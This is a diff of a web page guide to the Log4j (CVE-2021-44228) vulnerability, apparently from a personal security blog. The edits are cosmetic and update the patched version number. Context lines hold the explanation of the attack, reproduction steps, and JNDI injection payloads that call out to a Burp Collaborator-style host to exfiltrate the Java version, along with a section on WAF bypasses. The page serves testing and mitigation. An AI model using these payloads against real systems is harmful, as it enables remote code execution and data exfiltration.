@@ -5,18 +5,7 @@
     <title>CVE-2021-44228 - Log4J Start to End Guide Books</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="index, follow, max-snippet:-1, max-video-preview:-1, max-image-preview:large">
-    <link rel="canonical" href="https://akashpatil.me/log4j-book.html">
-    <meta property="og:url" content="https://akashpatil.me/log4j-book.html"/>
-    <meta property="og:title" content="CVE-2021-44228 - Log4J Start to End Guide Books"/>
-    <meta property="og:description" content="CVE-2021-44228 - Log4J Start to End Guide Book."/>
-    <meta property="og:site_name" content="akashpatil.me"/>
-    <meta property="og:image" content="https://github.com/akashrpatil/akashpatil.github.io/blob/main/img/blog/LOG4J.jpg"/>
-    <meta property="og:image:secure_url" content="https://github.com/akashrpatil/akashpatil.github.io/blob/main/img/blog/LOG4J.jpg">
-    <meta property="og:image:alt" content="CVE-2021-44228">
-    <meta name="twitter:title" content="CVE-2021-44228 - Log4J Start to End Guide Book - akashpatil.me">                                                                                                                            
-    <meta name="twitter:description" content="CVE-2021-44228 - Log4J Start to End Guide Books">
-    <meta name="twitter:site" content="@skypatil98">     
-    <meta name="twitter:image" content="https://github.com/akashrpatil/akashpatil.github.io/blob/main/img/blog/LOG4J.jpg">
+
                                                    
     <link rel="icon" type="image/x-icon" href="img/favi.png">
     <!-- Template Google Fonts -->
@@ -196,7 +185,7 @@
                    </script>
                     </div><br />
                     
-                   <h2>2. How it works ( Detection )</h2>
+                   <h2>2.<u>How it works ( Detection )</u></h2>
                      <p> 
 1. An attacker inserts the JNDI lookup/payload in a anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br><br>
 2. The payload is passed to log4j for logging.<br><br>
@@ -204,7 +193,7 @@
 4. The ldap server responds with directory information that contains the malicious java class.<br><br>
 5. Java deserializes or download the malicious java class and execute it.<br><br>
                     </p>
-                 <h2>3. Simple DNS Log Monitor Services</h2>
+                 <h2>3.<u>Simple DNS Log Monitor Services</u></h2>
  <p> 
 1. - <a href="https://canarytokens.org/generate">[canarytokens]</a><br>
 2. - <a href="http://ceye.io/">[ceye]</a><br>
@@ -213,7 +202,7 @@
 5. - <a href="https://portswigger.net/burp/documentation/collaborator">[burp collaborator]</a><br>
 6. - <a href="https://www.joshmcguigan.com/blog/run-your-own-dns-servers/">[run your own dns servers]</a><br>
                     </p><br>
-                   <h2>4. Steps to reproduce</h2> 
+                   <h2>4.<u>Steps to reproduce</u></h2> 
                     <p>
 1. Find the target.<br>
 2. Create DNS Service for Callback<br><br>
@@ -226,7 +215,7 @@
 5. For getting Java version, we’ll use this one: <code>${jndi:ldap://z${sys:java.version}.xyz.burpcollaborator.net/rce}</code><br>
 </p><br>
                           
-<h2>Payloads & WAF Bypasses</h2>
+<h2><u>Payloads & WAF Bypasses</u></h2>
 <pre><code>Want to know the Java version running on the target?<br>
 ${jndi:ldap://${sys:java.version}.collaborator.com}
 ${env:JAVA_VERSION}
@@ -329,7 +318,7 @@ Ask admin/system team to run a search/grep command on all servers to spot any fi
 
     2. <b>PERMANENT MITIGATION</b><br>
 
-Version 2.15.0 of log4j has been released without the vulnerability. log4j-core.jar is available on Apache Log4j page below, You
+Version 2.17.0 of log4j has been released without the vulnerability. log4j-core.jar is available on Apache Log4j official page, You
 can download it and update your system<br><br>
     
     3. <b>TEMPORARY MITIGATION</b><br>
